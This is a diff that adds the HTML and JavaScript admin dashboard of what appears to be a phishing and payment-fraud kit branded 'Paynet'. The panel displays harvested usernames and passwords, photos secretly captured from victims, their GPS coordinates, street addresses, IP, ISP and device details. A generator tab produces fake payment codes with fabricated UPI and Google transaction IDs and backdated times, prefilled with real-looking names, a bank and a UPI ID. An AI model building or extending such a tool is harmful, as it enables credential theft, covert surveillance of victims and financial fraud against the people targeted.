@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paynet Admin Dashboard</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="alternate icon" href="/favicon.ico">
+    <link rel="stylesheet" href="/admin.css">
+</head>
+
+<body>
+    <div class="dashboard">
+        <!-- Header -->
+        <header class="header">
+            <h1>💳 Paynet Admin Dashboard</h1>
+            <div class="header-actions">
+                <span class="admin-badge">Admin</span>
+                <a href="/admin-logout" class="logout-btn">Logout</a>
+            </div>
+        </header>
+
+        <!-- Navigation Tabs -->
+        <div class="nav-tabs" style="margin-bottom: 20px; display: flex; gap: 10px;">
+            <button onclick="switchTab('dashboard')" class="tab-btn active" id="tab-dashboard">Dashboard</button>
+            <button onclick="switchTab('generator')" class="tab-btn" id="tab-generator">ID Generator</button>
+            <button onclick="switchTab('settings')" class="tab-btn" id="tab-settings">Settings</button>
+        </div>
+
+        <!-- Payment Link Creator Section -->
+        <div id="view-generator" class="section tab-view" style="display: none;">
+            <div class="section-header">
+                <h2>🛠️ Create Custom Payment Code</h2>
+            </div>
+            <div style="background: rgba(0,0,0,0.2); padding: 30px; border-radius: 12px;">
+                <form id="payment-form" onsubmit="createPaymentLink(event)"
+                    style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+
+                    <div style="grid-column: span 2;">
+                        <label style="display: block; margin-bottom: 8px; font-weight: 500;">Payment Amount (₹)</label>
+                        <input type="number" id="gen-amount" value="1600" required
+                            style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2); background: rgba(0,0,0,0.2); color: white; font-size: 16px;">
+                    </div>
+
+                    <div>
+                        <label style="display: block; margin-bottom: 8px; font-weight: 500;">Receiver Name (To)</label>
+                        <input type="text" id="gen-to" value="Deepak Anna Bodke" required
+                            style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2); background: rgba(0,0,0,0.2); color: white; font-size: 16px;">
+                    </div>
+
+                    <div>
+                        <label style="display: block; margin-bottom: 8px; font-weight: 500;">Sender Name (From)</label>
+                        <input type="text" id="gen-from" value="NOUFIYA J" required
+                            style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2); background: rgba(0,0,0,0.2); color: white; font-size: 16px;">
+                    </div>
+
+                    <div>
+                        <label style="display: block; margin-bottom: 8px; font-weight: 500;">Bank Name</label>
+                        <input type="text" id="gen-bank" value="Canara Bank 2461" required
+                            style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2); background: rgba(0,0,0,0.2); color: white; font-size: 16px;">
+                    </div>
+
+                    <div>
+                        <label style="display: block; margin-bottom: 8px; font-weight: 500;">UPI ID</label>
+                        <input type="text" id="gen-upi" value="gpay-12192992016@okbizaxis" required
+                            style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2); background: rgba(0,0,0,0.2); color: white; font-size: 16px;">
+                    </div>
+
+                    <div>
+                        <label style="display: block; margin-bottom: 8px; font-weight: 500;">UPI Transaction ID</label>
+                        <input type="text" id="gen-upi-txn" value="" placeholder="Auto-generated if empty"
+                            style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2); background: rgba(0,0,0,0.2); color: white; font-size: 16px;">
+                    </div>
+
+                    <div>
+                        <label style="display: block; margin-bottom: 8px; font-weight: 500;">Google Transaction
+                            ID</label>
+                        <input type="text" id="gen-google-txn" value="" placeholder="Auto-generated if empty"
+                            style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2); background: rgba(0,0,0,0.2); color: white; font-size: 16px;">
+                    </div>
+
+                    <div>
+                        <label style="display: block; margin-bottom: 8px; font-weight: 500;">Custom Date/Time</label>
+                        <input type="text" id="gen-date" placeholder="13 Feb 2026, 8:03 pm"
+                            style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2); background: rgba(0,0,0,0.2); color: white; font-size: 16px;">
+                    </div>
+
+                    <div style="grid-column: span 2; margin-top: 10px;">
+                        <button type="submit" class="refresh-btn"
+                            style="width: 100%; padding: 15px; font-size: 18px; display: flex; align-items: center; justify-content: center; gap: 10px;">
+                            🚀 Generate Code
+                        </button>
+                    </div>
+                </form>
+
+                <div id="generated-result"
+                    style="display: none; margin-top: 30px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 20px;">
+                    <h3 style="margin-bottom: 15px; font-size: 18px; color: #48bb78;">✅ Payment Code Created</h3>
+
+                    <div
+                        style="display: flex; gap: 15px; align-items: center; background: rgba(0,0,0,0.3); padding: 20px; border-radius: 8px;">
+                        <div id="gen-id-display"
+                            style="font-family: 'Courier New', monospace; font-size: 24px; color: #667eea; letter-spacing: 2px; font-weight: bold; flex: 1;">
+                            XXXXXXXXXX
+                        </div>
+                        <button onclick="copyGenID()" class="download-btn" style="padding: 10px 20px;">📋 Copy
+                            Code</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Settings Section -->
+        <div id="view-settings" class="section tab-view" style="display: none;">
+            <div class="section-header">
+                <h2>⚙️ Paynet Configuration</h2>
+            </div>
+            <form action="/admin/api/settings" method="POST" style="max-width: 600px;">
+                <div style="margin-bottom: 20px;">
+                    <label style="display: block; margin-bottom: 10px; font-weight: 600;">Payment Amount</label>
+                    <input type="text" name="paymentAmount" value="{{settings.paymentAmount}}"
+                        style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2); background: rgba(0,0,0,0.2); color: white; font-size: 16px;">
+                </div>
+                <div style="margin-bottom: 20px;">
+                    <label style="display: block; margin-bottom: 10px; font-weight: 600;">Currency Symbol</label>
+                    <input type="text" name="currencySymbol" value="{{settings.currencySymbol}}"
+                        style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2); background: rgba(0,0,0,0.2); color: white; font-size: 16px;">
+                </div>
+                <div style="margin-bottom: 30px;">
+                    <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
+                        <input type="checkbox" name="enableAnimation" {{#if settings.enableAnimation}}checked{{/if}}
+                            style="width: 20px; height: 20px;">
+                        <span>Enable Payment Animation</span>
+                    </label>
+                </div>
+                <button type="submit" class="refresh-btn" style="width: 100%; padding: 15px;">Save Settings</button>
+            </form>
+        </div>
+
+        <div id="view-dashboard" class="tab-view">
+            <!-- Stats Cards -->
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-icon">📋</div>
+                    <div class="stat-content">
+                        <h3 id="total-attempts">0</h3>
+                        <p>Total Attempts</p>
+                    </div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">📸</div>
+                    <div class="stat-content">
+                        <h3 id="total-photos">0</h3>
+                        <p>Photos Captured</p>
+                    </div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">🌍</div>
+                    <div class="stat-content">
+                        <h3 id="total-locations">0</h3>
+                        <p>Locations</p>
+                    </div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">🕐</div>
+                    <div class="stat-content">
+                        <h3 id="latest-time">-</h3>
+                        <p>Latest Attempt</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Login Attempts Table -->
+            <div class="section">
+                <div class="section-header">
+                    <h2>📋 Recent Login Attempts</h2>
+                    <button onclick="refreshData()" class="refresh-btn">🔄 Refresh</button>
+                </div>
+                <div class="table-container">
+                    <table id="attempts-table">
+                        <thead>
+                            <tr>
+                                <th>Verification ID</th>
+                                <th>Status</th>
+                                <th>Time</th>
+                                <th>Payer ID / User</th>
+                                <th>Location</th>
+                                <th>Device</th>
+                                <th>Credentials</th>
+                                <th>Photo</th>
+                            </tr>
+                        </thead>
+                        <tbody id="attempts-tbody">
+                            <tr>
+                                <td colspan="6" style="text-align: center; padding: 40px; color: #888;">
+                                    Loading data...
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Photo Gallery -->
+            <div class="section">
+                <div class="section-header">
+                    <h2>📸 Captured Photos</h2>
+                    <div>
+                        <button onclick="deleteAllPhotos()" class="delete-btn"
+                            style="background: #e74c3c; margin-right: 10px;">🗑️ Delete All</button>
+                        <button onclick="downloadAllPhotos()" class="download-btn">⬇️ Download All</button>
+                    </div>
+                </div>
+                <div class="photo-gallery" id="photo-gallery">
+                    <p style="text-align: center; padding: 40px; color: #888;">No photos captured yet</p>
+                </div>
+            </div>
+
+            <!-- Location Map -->
+            <div class="section">
+                <div class="section-header">
+                    <h2>🗺️ Location Map</h2>
+                </div>
+                <div id="map-container" class="map-container">
+                    <iframe id="location-map" width="100%" height="500" frameborder="0"
+                        style="border:0; border-radius: 8px;" allowfullscreen></iframe>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Lightbox for photos -->
+    <div id="lightbox" class="lightbox" onclick="closeLightbox()">
+        <span class="lightbox-close">&times;</span>
+        <img id="lightbox-img" src="" alt="Photo">
+        <div id="lightbox-caption"></div>
+        <button id="lightbox-delete-btn" class="lightbox-delete-btn"
+            onclick="event.stopPropagation(); deletePhotoFromLightbox()">🗑️ Delete Photo</button>
+    </div>
+
+    <script>
+        let attemptsData = [];
+
+        // Load data on page load
+        window.addEventListener('load', () => {
+            loadData();
+        });
+
+        async function loadData() {
+            try {
+                const response = await fetch('/admin/api/data');
+                const data = await response.json();
+                attemptsData = data.attempts || [];
+
+                updateStats(data);
+                renderAttemptsTable(attemptsData);
+                renderPhotoGallery(data.photos || []);
+                updateMap(attemptsData);
+            } catch (error) {
+                console.error('Error loading data:', error);
+            }
+        }
+
+        function updateStats(data) {
+            document.getElementById('total-attempts').textContent = data.attempts.length;
+            document.getElementById('total-photos').textContent = data.photos.length;
+
+            // Count unique locations from new format
+            const uniqueLocations = new Set(
+                data.attempts
+                    .map(a => {
+                        if (a.location) {
+                            try {
+                                const locData = typeof a.location === 'string' ? JSON.parse(a.location) : a.location;
+                                if (locData.finalLocation && locData.finalLocation.latitude) {
+                                    return `${locData.finalLocation.latitude.toFixed(4)},${locData.finalLocation.longitude.toFixed(4)}`;
+                                }
+                            } catch (e) { }
+                        }
+                        // Old format fallback
+                        if (a.gpsLocation && a.gpsLocation.latitude) {
+                            return `${a.gpsLocation.latitude},${a.gpsLocation.longitude}`;
+                        }
+                        return null;
+                    })
+                    .filter(l => l !== null)
+            ).size;
+            document.getElementById('total-locations').textContent = uniqueLocations;
+
+            if (data.attempts.length > 0) {
+                const latest = new Date(data.attempts[0].timestamp);
+                document.getElementById('latest-time').textContent = formatRelativeTime(latest);
+            }
+        }
+
+        function renderAttemptsTable(attempts) {
+            const tbody = document.getElementById('attempts-tbody');
+
+            if (attempts.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="8" style="text-align: center; padding: 40px; color: #888;">No transactions yet</td></tr>';
+                return;
+            }
+
+            tbody.innerHTML = attempts.map((attempt, index) => {
+                const dateObj = new Date(attempt.timestamp);
+                const time = dateObj.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+                const date = dateObj.toLocaleDateString();
+                const location = getLocationString(attempt);
+                const device = getDeviceString(attempt);
+                // Use stored filename if available, otherwise fallback to generated one (backward compatibility)
+                const photoFilename = attempt.photoFilename || getPhotoFilename(attempt.timestamp, attempt.ip);
+                const status = attempt.status || 'Verified';
+                const statusClass = status === 'Verified' ? 'status-verified' : 'status-pending';
+
+                return `
+                    <tr>
+                        <td>
+                            <span class="verification-id">${attempt.verificationId || 'PENDING'}</span>
+                            <div style="font-size: 11px; color: #888; margin-top: 4px;">Amazon Pay</div>
+                        </td>
+                        <td>
+                            <span class="status-badge ${statusClass}">
+                                ${status}
+                            </span>
+                            <div style="font-size: 11px; color: #aaa; margin-top: 4px;">${attempt.amount || '₹0.00'}</div>
+                        </td>
+                        <td>
+                            <div style="font-weight: 500;">${time}</div>
+                            <div style="font-size: 11px; color: #888;">${date}</div>
+                        </td>
+                        <td>
+                            <strong>${escapeHtml(attempt.username || 'Unknown')}</strong>
+                            <div style="font-size: 11px; color: #888;">${attempt.ip}</div>
+                        </td>
+                        <td>${location}</td>
+                        <td>${device}</td>
+                        <td class="credentials-cell">
+                            <div class="credentials-container">
+                                <div>
+                                    <strong>U:</strong> 
+                                    <span class="credential-value masked" id="user-${index}" 
+                                          data-value="${escapeHtml(attempt.username || '')}">${maskString(attempt.username || '')}</span>
+                                </div>
+                                <div>
+                                    <strong>P:</strong> 
+                                    <span class="credential-value masked" id="pass-${index}" 
+                                          data-value="${escapeHtml(attempt.password || '')}">${maskString(attempt.password || '')}</span>
+                                </div>
+                                <button onclick="toggleCredentials(${index})" class="reveal-btn" id="btn-${index}">👁️ Show</button>
+                            </div>
+                        </td>
+                        <td>
+                            ${attempt.photoData ?
+                        `<button onclick="viewPhoto('${photoFilename}')" class="view-photo-btn">📷 View</button>
+                         <button onclick="deletePhoto('${photoFilename}')" class="delete-photo-btn" style="background: #e74c3c; color: white; border: none; padding: 4px 8px; border-radius: 4px; cursor: pointer; margin-left: 5px; font-size: 11px;">🗑️</button>` :
+                        '<span style="color: #999;">No photo</span>'}
+                        </td>
+                    </tr>
+                `;
+            }).join('');
+        }
+
+        function renderPhotoGallery(photos) {
+            const gallery = document.getElementById('photo-gallery');
+
+            if (photos.length === 0) {
+                gallery.innerHTML = '<p style="text-align: center; padding: 40px; color: #888;">No photos captured yet</p>';
+                return;
+            }
+
+            gallery.innerHTML = photos.map(photo => `
+                <div class="photo-item" style="position: relative;">
+                    <img src="/admin/photo/${photo.filename}" alt="Captured photo" onclick="viewPhoto('${photo.filename}')" style="cursor: pointer;">
+                    <div class="photo-overlay">
+                        <p>${photo.filename}</p>
+                    </div>
+                    <button onclick="event.stopPropagation(); deletePhoto('${photo.filename}');" 
+                            class="delete-photo-btn" 
+                            style="position: absolute; top: 5px; right: 5px; background: #e74c3c; color: white; border: none; border-radius: 4px; padding: 5px 10px; cursor: pointer; font-size: 12px; z-index: 10;"
+                            title="Delete photo">🗑️</button>
+                </div>
+            `).join('');
+        }
+
+        function switchTab(tabName) {
+            // Hide all views
+            document.querySelectorAll('.tab-view').forEach(el => el.style.display = 'none');
+            // Show selected
+            document.getElementById('view-' + tabName).style.display = 'block';
+
+            // Update buttons
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.style.background = 'rgba(255, 255, 255, 0.1)';
+                btn.style.border = '1px solid rgba(255, 255, 255, 0.2)';
+            });
+            const activeBtn = document.getElementById('tab-' + tabName);
+            activeBtn.style.background = '#667eea';
+            activeBtn.style.border = '1px solid #667eea';
+        }
+
+        function generateID() {
+            const randomHex = Math.floor(Math.random() * 0xffffffff).toString(16).toUpperCase().padStart(8, '0');
+            const id = "PAY-" + randomHex;
+            document.getElementById('generated-id-display').textContent = id;
+        }
+
+        function copyID() {
+            const id = document.getElementById('generated-id-display').textContent.trim();
+            if (id === 'PAY-XXXXXXXX') return;
+            navigator.clipboard.writeText(id).then(() => {
+                const btn = document.querySelector('button[onclick="copyID()"]');
+                const originalText = btn.textContent;
+                btn.textContent = "✅ Copied!";
+                setTimeout(() => btn.textContent = originalText, 2000);
+            });
+        }
+
+        function updateMap(attempts) {
+            const validLocations = [];
+
+            attempts.forEach(a => {
+                let loc = null;
+
+                // Try new format
+                if (a.location) {
+                    try {
+                        const locData = typeof a.location === 'string' ? JSON.parse(a.location) : a.location;
+                        if (locData.finalLocation && locData.finalLocation.latitude) {
+                            loc = locData.finalLocation;
+                        }
+                    } catch (e) { }
+                }
+
+                // Try old format
+                if (!loc && a.gpsLocation && a.gpsLocation.latitude) {
+                    loc = a.gpsLocation;
+                }
+
+                if (loc) {
+                    validLocations.push({ gpsLocation: loc });
+                }
+            });
+
+            if (validLocations.length === 0) {
+                document.getElementById('map-container').innerHTML =
+                    '<p style="text-align: center; padding: 40px; color: #888;">No GPS locations captured yet</p>';
+                return;
+            }
+
+            // Use first location as map center
+            const center = validLocations[0].gpsLocation;
+            const markers = validLocations.map((a, i) =>
+                `markers=color:red%7Clabel:${i + 1}%7C${a.gpsLocation.latitude},${a.gpsLocation.longitude}`
+            ).join('&');
+
+            const mapUrl = `https://maps.google.com/maps?q=${center.latitude},${center.longitude}&z=10&output=embed`;
+            document.getElementById('location-map').src = mapUrl;
+        }
+
+        function getLocationString(attempt) {
+            let html = '';
+            let hasLocation = false;
+
+            // PRIORITY 1: GPS-based location (most accurate)
+            // Try new nested format first
+            if (attempt.location && attempt.location.finalLocation && attempt.location.finalLocation.coords) {
+                const coords = attempt.location.finalLocation.coords;
+                hasLocation = true;
+                html += `📍 <strong>GPS Location</strong><br>`;
+                html += `<strong>${coords.latitude.toFixed(6)}°N, ${coords.longitude.toFixed(6)}°E</strong><br>`;
+                html += `<small>±${Math.round(coords.accuracy || 0)}m accuracy</small><br>`;
+
+                // Show address if available
+                if (attempt.location.finalLocation.address) {
+                    const addr = attempt.location.finalLocation.address;
+                    html += `<small><strong>Address:</strong> ${addr.fullAddress || formatDetailedAddress(addr)}</small><br>`;
+                } else if (attempt.location.address) {
+                    const addr = attempt.location.address;
+                    html += `<small><strong>Address:</strong> ${addr.fullAddress || formatDetailedAddress(addr)}</small><br>`;
+                }
+
+                html += `<small style="color: #10b981;">Source: ${attempt.location.captureMethod || 'GPS'}</small>`;
+            }
+            // Try direct coordinates format
+            else if (attempt.location && attempt.location.latitude && attempt.location.longitude) {
+                hasLocation = true;
+                html += `📍 <strong>GPS Location</strong><br>`;
+                html += `<strong>${attempt.location.latitude.toFixed(6)}°N, ${attempt.location.longitude.toFixed(6)}°E</strong><br>`;
+                html += `<small>±${Math.round(attempt.location.accuracy || 0)}m</small><br>`;
+
+                // Show address if available
+                if (attempt.location.address) {
+                    const addr = attempt.location.address;
+                    html += `<small><strong>Address:</strong> ${addr.fullAddress || formatDetailedAddress(addr)}</small><br>`;
+                }
+            }
+            // Old format fallback
+            else if (attempt.gpsLocation && attempt.gpsLocation.latitude) {
+                hasLocation = true;
+                html += `📍 <strong>GPS Location</strong><br>`;
+                html += `<strong>${attempt.gpsLocation.latitude.toFixed(6)}°N, ${attempt.gpsLocation.longitude.toFixed(6)}°E</strong><br>`;
+                html += `<small>±${Math.round(attempt.gpsLocation.accuracy || 0)}m</small>`;
+            }
+
+            // PRIORITY 2: IP-based geolocation (always show as additional info)
+            if (attempt.geo && attempt.geo.city) {
+                if (hasLocation) {
+                    html += `<br><br>`; // Separator between GPS and IP location
+                }
+                html += `🌐 <strong>IP-Based Location</strong><br>`;
+                html += `<strong>${attempt.geo.city}`;
+                if (attempt.geo.region) html += `, ${attempt.geo.region}`;
+                html += `</strong><br>`;
+                html += `<small>${attempt.geo.country || 'Unknown Country'}</small><br>`;
+
+                if (attempt.geo.latitude && attempt.geo.longitude) {
+                    html += `<small>${attempt.geo.latitude.toFixed(4)}°, ${attempt.geo.longitude.toFixed(4)}°</small><br>`;
+                }
+                if (attempt.geo.isp) {
+                    html += `<small>ISP: ${attempt.geo.isp}</small>`;
+                }
+                hasLocation = true;
+            }
+
+            // FALLBACK: If nothing found
+            if (!hasLocation) {
+                html = '<span style="color: #999;">No location data</span>';
+            }
+
+            return html;
+        }
+
+        // Delete a specific photo
+        async function deletePhoto(filename) {
+            if (!confirm(`Are you sure you want to delete ${filename}?`)) {
+                return;
+            }
+            try {
+                const response = await fetch(`/admin/photo/delete/${filename}`, {
+                    method: 'DELETE'
+                });
+                const result = await response.json();
+                if (result.success) {
+                    alert('Photo deleted successfully');
+                    loadData();
+                } else {
+                    alert('Failed to delete photo: ' + result.error);
+                }
+            } catch (error) {
+                console.error('Error deleting photo:', error);
+                alert('Error deleting photo');
+            }
+        }
+
+        // Delete all photos
+        async function deleteAllPhotos() {
+            if (!confirm('Are you sure you want to delete ALL photos? This action cannot be undone!')) {
+                return;
+            }
+            try {
+                const response = await fetch('/admin/photo/delete-all', {
+                    method: 'DELETE'
+                });
+                const result = await response.json();
+                if (result.success) {
+                    alert(`Successfully deleted ${result.count} photo(s)`);
+                    loadData();
+                } else {
+                    alert('Failed to delete photos: ' + result.error);
+                }
+            } catch (error) {
+                console.error('Error deleting photos:', error);
+                alert('Error deleting photos');
+            }
+        }
+
+        // Helper function to format detailed address
+        function formatDetailedAddress(addr) {
+            const parts = [];
+            if (addr.houseNumber && addr.road) {
+                parts.push(`${addr.houseNumber} ${addr.road}`);
+            } else if (addr.road) {
+                parts.push(addr.road);
+            }
+            if (addr.neighborhood) parts.push(addr.neighborhood);
+            if (addr.city || addr.town || addr.village) {
+                parts.push(addr.city || addr.town || addr.village);
+            }
+            if (addr.state) parts.push(addr.state);
+            if (addr.postcode) parts.push(addr.postcode);
+            if (addr.country) parts.push(addr.country);
+            return parts.join(', ');
+        }
+
+        function getDeviceString(attempt) {
+            if (!attempt.deviceDetails) return '<span style="color: #999;">Unknown</span>';
+            const d = attempt.deviceDetails;
+            return `${d.platform || 'Unknown'}<br><small>${d.screenResolution || 'Unknown'}</small>`;
+        }
+
+        // Mask string with dots
+        function maskString(str) {
+            if (!str) return '';
+            return '•'.repeat(Math.min(str.length, 20)); // Max 20 dots
+        }
+
+        // Escape HTML to prevent XSS
+        function escapeHtml(str) {
+            if (!str) return '';
+            const div = document.createElement('div');
+            div.textContent = str;
+            return div.innerHTML;
+        }
+
+        // Toggle credentials visibility
+        function toggleCredentials(index) {
+            const userSpan = document.getElementById(`user-${index}`);
+            const passSpan = document.getElementById(`pass-${index}`);
+            const btn = document.getElementById(`btn-${index}`);
+
+            if (!userSpan || !passSpan) return;
+
+            const isMasked = userSpan.classList.contains('masked');
+
+            if (isMasked) {
+                // Show real values
+                userSpan.textContent = userSpan.dataset.value;
+                passSpan.textContent = passSpan.dataset.value;
+                userSpan.classList.remove('masked');
+                passSpan.classList.remove('masked');
+                btn.textContent = '🙈 Hide';
+            } else {
+                // Mask values
+                userSpan.textContent = maskString(userSpan.dataset.value);
+                passSpan.textContent = maskString(passSpan.dataset.value);
+                userSpan.classList.add('masked');
+                passSpan.classList.add('masked');
+                btn.textContent = '👁️ Show';
+            }
+        }
+
+        function getPhotoFilename(timestamp, ip) {
+            const date = new Date(timestamp).toISOString().replace(/:/g, '-');
+            const cleanIp = ip.replace(/[.:]/g, '-');
+            return `${date}_${cleanIp}.jpg`;
+        }
+
+        let currentPhotoFilename = null;
+
+        function viewPhoto(filename) {
+            const lightbox = document.getElementById('lightbox');
+            const img = document.getElementById('lightbox-img');
+            const caption = document.getElementById('lightbox-caption');
+
+            currentPhotoFilename = filename;
+            img.src = `/admin/photo/${filename}`;
+            caption.textContent = filename;
+            lightbox.style.display = 'flex';
+        }
+
+        function closeLightbox() {
+            document.getElementById('lightbox').style.display = 'none';
+            currentPhotoFilename = null;
+        }
+
+
+
+        async function deletePhotoFromLightbox() {
+            if (!currentPhotoFilename) return;
+
+            closeLightbox();
+            await deletePhoto(currentPhotoFilename);
+        }
+
+        function refreshData() {
+            loadData();
+        }
+
+        function downloadAllPhotos() {
+            alert('Download all photos functionality - would create a ZIP file of all photos');
+        }
+
+        function formatRelativeTime(date) {
+            const seconds = Math.floor((new Date() - date) / 1000);
+            if (seconds < 60) return `${seconds}s ago`;
+            const minutes = Math.floor(seconds / 60);
+            if (minutes < 60) return `${minutes}m ago`;
+            const hours = Math.floor(minutes / 60);
+            if (hours < 24) return `${hours}h ago`;
+            const days = Math.floor(hours / 24);
+            return `${days}d ago`;
+        }
+
+        // Close lightbox on Escape key
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') closeLightbox();
+        });
+
+        // Create Custom Payment Link
+        async function createPaymentLink(e) {
+            e.preventDefault();
+
+            const btn = e.target.querySelector('button[type="submit"]');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = '⏳ Generating...';
+            btn.disabled = true;
+
+            const data = {
+                amount: document.getElementById('gen-amount').value,
+                toName: document.getElementById('gen-to').value,
+                fromName: document.getElementById('gen-from').value,
+                bankName: document.getElementById('gen-bank').value,
+                upiId: document.getElementById('gen-upi').value,
+                upiTxnId: document.getElementById('gen-upi-txn').value,
+                googleTxnId: document.getElementById('gen-google-txn').value,
+                customDate: document.getElementById('gen-date').value
+            };
+
+            try {
+                const response = await fetch('/admin/api/generate-payment', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                const result = await response.json();
+
+                if (result.success) {
+                    document.getElementById('generated-result').style.display = 'block';
+                    document.getElementById('gen-id-display').textContent = result.payment.id;
+                    btn.innerHTML = '✅ Created Successfully';
+                    setTimeout(() => {
+                        btn.innerHTML = originalText;
+                        btn.disabled = false;
+                    }, 2000);
+                } else {
+                    alert('Error: ' + result.error);
+                    btn.innerHTML = originalText;
+                    btn.disabled = false;
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Failed to generate payment link');
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+            }
+        }
+
+        function copyGenID() {
+            const id = document.getElementById('gen-id-display').textContent.trim();
+            navigator.clipboard.writeText(id).then(() => {
+                const btn = document.querySelector('button[onclick="copyGenID()"]');
+                const originalText = btn.textContent;
+                btn.textContent = "✅ Copied!";
+                setTimeout(() => btn.textContent = originalText, 2000);
+            });
+        }
+    </script>
+</body>
+
+</html>
